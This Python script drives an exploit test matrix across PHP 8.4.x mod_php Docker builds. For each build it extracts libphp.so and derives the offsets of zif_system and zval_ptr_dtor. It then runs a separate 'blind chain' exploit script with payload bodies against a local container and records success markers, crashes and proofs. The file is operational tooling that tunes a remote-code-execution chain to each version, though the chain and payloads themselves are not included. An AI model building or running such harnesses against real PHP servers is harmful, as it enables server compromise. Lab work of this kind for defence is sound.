#!/usr/bin/env python3
"""Drive the 8.4.x mod_php matrix: derive offsets, run the blind chain per build."""
import json, os, re, shutil, subprocess, sys, time, urllib.request

D = "/tmp/opencode/research/modphp_84_matrix_20261023T074116Z"
PORT0 = 18800
VERSIONS = [str(v) for v in ([1,2,3,4,5,6,7,8] + list(range(10, 28)))]  # 8.4.9 never released
ONLY = os.environ.get("ONLY", "")
if ONLY:
    VERSIONS = ONLY.split(",")
KEEP_IMAGES = os.environ.get("KEEP_IMAGES", "0") == "1"


def sh(cmd, **kw):
    return subprocess.run(cmd, shell=isinstance(cmd, str), capture_output=True,
                          text=True, **kw)


def pull(v):
    img = "php:%s-apache" % v
    r = sh(["docker", "image", "inspect", img])
    if r.returncode == 0:
        return True
    for k in range(3):
        r = sh(["docker", "pull", img])
        if r.returncode == 0:
            return True
        print("  pull retry", k, r.stderr[-200:], flush=True)
        time.sleep(5)
    return False


def symbols(so):
    r = sh(["readelf", "-sW", so])
    out = {}
    for line in r.stdout.splitlines():
        m = re.match(r"\s*\d+:\s+([0-9a-f]+)\s+\d+\s+\w+\s+\w+\s+\w+\s+\w+\s+(\S+)$", line)
        if not m:
            continue
        name = m.group(2)
        if name in ("zif_system", "zval_ptr_dtor") and name not in out:
            out[name] = int(m.group(1), 16)
    return out


def wait_ready(port, tries=120):
    for _ in range(tries):
        try:
            with urllib.request.urlopen("http://127.0.0.1:%d/index.php" % port, timeout=2) as f:
                if f.status == 200:
                    return True
        except Exception:
            pass
        time.sleep(0.5)
    return False


def main():
    os.makedirs(os.path.join(D, "receipts"), exist_ok=True)
    for v in VERSIONS:
        if os.path.exists(os.path.join(D, "out", v, "result.json")):
            print("skip", v, flush=True)
            continue
        port = PORT0 + int(v.split(".")[-1])
        ctr = "m84-%s" % v
        img = "php:%s-apache" % v
        rdir = os.path.join(D, "receipts", v)
        os.makedirs(rdir, exist_ok=True)
        meta = {"version": v, "image": img, "port": port}
        print("=== %s" % v, flush=True)
        if not pull(v):
            meta["error"] = "image_unavailable"
            json.dump(meta, open(os.path.join(rdir, "meta.json"), "w"), indent=1)
            continue
        meta["image_id"] = sh(["docker", "image", "inspect", img,
                               "--format", "{{.Id}}"]).stdout.strip()
        # extract libphp.so + php.ini-production
        sh(["docker", "rm", "-f", ctr])
        r = sh(["docker", "create", "--name", ctr, img])
        if r.returncode != 0:
            meta["error"] = "create_failed: " + r.stderr[-300:]
            json.dump(meta, open(os.path.join(rdir, "meta.json"), "w"), indent=1)
            continue
        so = os.path.join(D, "so", "libphp-%s.so" % v)
        ini = os.path.join(D, "lab", "php.ini-production-%s" % v)
        sh(["docker", "cp", ctr + ":/usr/lib/apache2/modules/libphp.so", so])
        sh(["docker", "cp", ctr + ":/usr/local/etc/php/php.ini-production", ini])
        sh(["docker", "rm", "-f", ctr])
        if not os.path.exists(so):
            meta["error"] = "libphp_missing"
            json.dump(meta, open(os.path.join(rdir, "meta.json"), "w"), indent=1)
            continue
        syms = symbols(so)
        meta["so_sha256"] = sh(["sha256sum", so]).stdout.split()[0]
        meta["so_bytes"] = os.path.getsize(so)
        meta["symbols"] = {k: hex(v) for k, v in syms.items()}
        if "zif_system" not in syms or "zval_ptr_dtor" not in syms:
            meta["error"] = "symbols_missing"
            json.dump(meta, open(os.path.join(rdir, "meta.json"), "w"), indent=1)
            continue
        outdir_v = os.path.join(D, "out", v)
        outproof = os.path.join(D, "out", "%s_proof" % v)
        os.makedirs(outdir_v, exist_ok=True)
        os.makedirs(outproof, exist_ok=True)
        sh(["docker", "run", "-d", "--name", ctr,
            "-p", "127.0.0.1:%d:80" % port,
            "-v", os.path.join(D, "lab/conf/000-default.conf") + ":/etc/apache2/sites-enabled/000-default.conf",
            "-v", os.path.join(D, "lab/www") + ":/var/www/html:ro",
            "-v", ini + ":/usr/local/etc/php/php.ini:ro",
            "-v", outproof + ":/out",
            img])
        if not wait_ready(port):
            meta["error"] = "not_ready"
            json.dump(meta, open(os.path.join(rdir, "meta.json"), "w"), indent=1)
            sh(["docker", "rm", "-f", ctr])
            continue
        meta["php"] = sh(["docker", "exec", ctr, "php", "-v"]).stdout.splitlines()[:1]
        meta["apache"] = sh(["docker", "exec", ctr, "apache2", "-v"]).stdout.strip()
        meta["ini_sha256"] = sh(["sha256sum", ini]).stdout.split()[0]
        meta["ini_md5"] = sh(["md5sum", ini]).stdout.split()[0]
        meta["workers"] = sh(["docker", "exec", ctr, "sh", "-c",
                              "ps -eo comm | grep -c apache2"]).stdout.strip()
        meta["effective_ini"] = sh(["docker", "exec", ctr, "sh", "-c",
                                    "curl -s http://127.0.0.1/diag.php 2>/dev/null || php -r 'echo \"na\";'"]).stdout.strip()
        # chain attempts
        attempts = []
        ok = False
        for k in range(3):
            marker = "M84_%s_t%d" % (v.replace(".", ""), k)
            cmd = [sys.executable, os.path.join(D, "scripts/chain84.py"),
                   "--port", str(port), "--container", ctr,
                   "--a1", os.path.join(D, "bodies/a1.bin"),
                   "--b1", os.path.join(D, "bodies/b1.bin"),
                   "--n", "5",
                   "--zif-off", hex(syms["zif_system"]),
                   "--zdtor-off", hex(syms["zval_ptr_dtor"]),
                   "--s-off", "0xF8398",
                   "--marker", marker,
                   "--outdir", os.path.join(outdir_v, "try%d" % k),
                   "--restart"]
            r = sh(cmd, timeout=900)
            resf = os.path.join(outdir_v, "try%d" % k, "result.json")
            res = json.load(open(resf)) if os.path.exists(resf) else {}
            attempts.append({"try": k, "marker": marker, "rc": r.returncode,
                             "success": res.get("success", False),
                             "failed": res.get("failed"), "result": resf,
                             "stdout_tail": r.stdout[-1500:]})
            print("  try%d success=%s failed=%s" % (k, res.get("success"), res.get("failed")), flush=True)
            if res.get("success"):
                ok = True
                break
            if res.get("failed") == "B1" and k >= 1:
                break
        meta["attempts"] = attempts
        meta["success"] = ok
        # logs / attribution
        logs = sh(["docker", "logs", ctr])
        open(os.path.join(rdir, "docker.log"), "w").write(logs.stdout + logs.stderr)
        acc = sh(["docker", "exec", ctr, "cat", "/var/log/apache2/p2s-access.log"])
        open(os.path.join(rdir, "access.log"), "w").write(acc.stdout)
        crash = [l for l in (logs.stdout + logs.stderr).splitlines()
                 if "Segmentation" in l or "Aborted" in l or "AH00052" in l]
        meta["crash_lines"] = crash[-6:]
        meta["proof"] = attempts[-1].get("result") and json.load(open(attempts[-1]["result"])).get("proof", "")
        json.dump(meta, open(os.path.join(rdir, "meta.json"), "w"), indent=1)
        sh(["docker", "rm", "-f", ctr])
        if not KEEP_IMAGES:
            sh(["docker", "rmi", img])
        print("  -> success=%s  %s" % (ok, meta.get("error", "")), flush=True)


if __name__ == "__main__":
    main()
